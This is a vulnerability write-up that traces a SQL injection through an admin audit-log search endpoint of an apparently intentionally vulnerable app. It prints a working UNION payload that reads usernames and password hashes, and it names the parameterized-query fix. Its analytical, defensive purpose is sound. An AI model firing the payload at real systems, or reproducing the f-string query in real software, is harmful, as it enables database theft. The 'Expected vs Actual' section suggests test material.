# VULN-020 — SQL Injection in Admin Audit Search (`q`)

- **CWE**: 89
- **Severity**: High+
- **Endpoint**: `GET /admin/audit`
- **Sink**: `admin.py:162-167`

## Static Data Flow Trace

```
1. ENTRY: GET /admin/audit?q=%25' UNION SELECT id,username,password,role,email FROM users--
   (q = "%' UNION SELECT ... --")
   -> admin.py:159  q = request.args.get("q", "")

2. PROPAGATION: q interpolated into the LIKE clause via f-string.
   -> admin.py:165-166
      f"SELECT * FROM audit_log WHERE action LIKE '%{q}%' OR detail LIKE '%{q}%'"

3. SINK: executed directly.
   -> admin.py:167  db.execute(...).fetchall()
   Concrete SQL:
      SELECT * FROM audit_log WHERE action LIKE '%%' UNION SELECT
      id,username,password,role,email FROM users-- %' OR ...
   The quote breaks out of the LIKE literal; UNION reads the users table.

4. IMPACT: Cross-table DB read (dump users + password hashes).
```

## Attacker gains
Arbitrary table read via UNION out of the audit-log search.

Note: the `q` SSTI claim (admin.py:171-177) is a FALSE POSITIVE — `q` is a Jinja context variable rendered as `{{ q }}` with autoescape ON, not template source. The real defect on `q` is this SQLi.

## Expected vs Actual
- Secure app: parameterized LIKE with a bound `%q%` parameter.
- Vulnerable app: f-string interpolation → UNION injection succeeds.
